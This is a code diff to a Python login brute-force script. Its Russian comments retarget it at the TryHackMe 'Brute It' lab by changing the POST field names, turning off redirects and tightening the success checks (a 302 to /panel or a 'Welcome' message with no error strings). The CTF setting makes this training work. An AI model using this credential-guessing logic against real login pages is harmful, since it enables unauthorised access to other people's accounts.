@@ -34,32 +34,43 @@ def read_large_file(file_path):
         sys.exit(1)
 
 def try_login(url, username, password, session, verify_ssl):
-    """Безопасная попытка входа с несколькими независимыми условиями успеха"""
+    """Точная проверка для TryHackMe: Brute It"""
     try:
         payload = {
-            'username': username,
-            'password': password
+            'user': username,   # Было: 'username'
+            'pass': password    # Было: 'password'
         }
         
         response = session.post(
             url,
             data=payload,
             timeout=TIMEOUT,
-            allow_redirects=True
+            allow_redirects=False  # Отключаем авто-редиректы
         )
         
-        # Условие 1: Редирект 302
-        condition_302 = response.status_code == 302
+        # Условие 1: Точный редирект на /panel (302 + Location: /panel)
+        is_302_redirect = (
+            response.status_code == 302 and 
+            'Location' in response.headers and 
+            response.headers['Location'].strip('/') == 'panel'
+        )
         
-        # Условие 2: Ключевые слова в теле ответа
-        keywords = ["Welcome", "Dashboard", "phpMyAdmin", "Главная"]
-        condition_keywords = any(keyword in response.text for keyword in keywords)
+        # Условие 2: Проверка содержимого ответа на наличие сообщения об успехе
+        is_welcome_message = "Welcome" in response.text or "Logged in" in response.text
         
-        # Условие 3: Наличие куки 'session'
-        condition_cookie = any('session' in cookie.name for cookie in session.cookies)
+        # Условие 3: Строгая проверка на отсутствие ошибок
+        error_keywords = [
+            "Invalid username/password",
+            "Please login",
+            "Wrong credentials",
+            "Login failed",
+            "Incorrect",
+            "Unauthorized"
+        ]
+        has_error = any(keyword in response.text for keyword in error_keywords)
         
-        # Успех, если хотя бы одно из условий выполнено
-        success = condition_302 or condition_keywords or condition_cookie
+        # Успех только если есть редирект ИЛИ сообщение Welcome И НЕТ ошибок
+        success = (is_302_redirect or is_welcome_message) and not has_error
         
         return success, username, password
         
